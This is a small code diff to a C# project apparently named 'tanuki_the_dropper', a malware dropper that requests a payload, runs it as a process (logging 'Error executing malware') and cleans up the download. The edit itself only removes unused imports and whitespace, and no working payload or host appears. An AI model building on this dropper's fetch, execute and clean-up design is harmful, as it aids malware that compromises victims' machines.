@@ -1,12 +1,7 @@
 ﻿using Packets;
-using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO.Compression;
-using System.Linq;
 using System.Numerics;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace tanuki_the_dropper
 {
@@ -160,7 +155,7 @@ namespace tanuki_the_dropper
 
                 byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                 comm.SendMessage(endRequest_bytes);
-   
+
             }
             catch (Exception ex)
             {
@@ -188,7 +183,7 @@ namespace tanuki_the_dropper
                 var exitCode = proc.ExitCode;
                 proc.Close();
             }
-            catch (Exception ex) { Utility.ConsoleLog($"Error executing malware: {ex.Message}");  throw; }
+            catch (Exception ex) { Utility.ConsoleLog($"Error executing malware: {ex.Message}"); throw; }
         }
 
         private void CleanDownload()
